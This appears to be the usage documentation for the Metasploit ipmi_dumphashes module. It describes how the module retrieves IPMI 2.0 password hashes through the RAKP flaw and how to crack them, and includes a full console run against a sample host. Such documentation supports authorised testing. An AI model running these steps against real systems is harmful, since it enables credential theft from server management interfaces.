The ipmi_dumphashes module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.

## Vulnerable Devices

Any IPMI 2.0 device implementing the RAKP protocol according to the IPMI specification is vulnerable. This is a design flaw rather than a vendor-specific vulnerability.

## Verification Steps

Set RHOSTS to the target device or range and run:

```
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf auxiliary(ipmi_dumphashes) > set RHOSTS 192.168.1.2
RHOSTS => 192.168.1.2
msf auxiliary(ipmi_dumphashes) > run

[*] 192.168.1.2:623 - IPMI - Sending IPMI probes
[*] 192.168.1.2:623 - IPMI - Trying username 'ADMIN'...
[-] 192.168.1.2:623 - IPMI - Returned error code 13 for username ADMIN: Unauthorized name
[*] 192.168.1.2:623 - IPMI - Trying username 'admin'...
[-] 192.168.1.2:623 - IPMI - Returned error code 13 for username admin: Unauthorized name
[*] 192.168.1.2:623 - IPMI - Trying username 'root'...
[+] 192.168.1.2:623 - IPMI - Hash found: root:redacted
[*] 192.168.1.2:623 - IPMI - Trying username 'Administrator'...
[-] 192.168.1.2:623 - IPMI - Returned error code 13 for username Administrator: Unauthorized name
[*] 192.168.1.2:623 - IPMI - Trying username 'USERID'...
[-] 192.168.1.2:623 - IPMI - Returned error code 13 for username USERID: Unauthorized name
[*] 192.168.1.2:623 - IPMI - Trying username 'guest'...
[-] 192.168.1.2:623 - IPMI - Returned error code 13 for username guest: Unauthorized name
[*] 192.168.1.2:623 - IPMI - Trying username ''...
[+] 192.168.1.2:623 - IPMI - Hash found: redacted
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
